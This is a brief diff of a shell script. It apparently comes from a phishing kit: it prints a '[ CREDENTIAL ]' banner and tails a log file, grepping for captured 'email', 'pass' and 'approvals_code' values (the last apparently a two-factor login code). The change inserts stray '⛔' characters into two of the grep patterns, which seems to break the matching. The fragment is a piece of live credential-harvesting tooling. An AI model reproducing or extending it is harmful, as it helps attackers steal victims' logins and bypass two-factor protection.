@@ -79,7 +79,7 @@ echo ""
                 echo ""
                 echo -e $green "//  [ CREDENTIAL ] //"
                 echo ""
-                tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
+                tail -f log.txt | grep -e "⛔email" -e "⛔pass" -e "approvals_code"
 
 
 
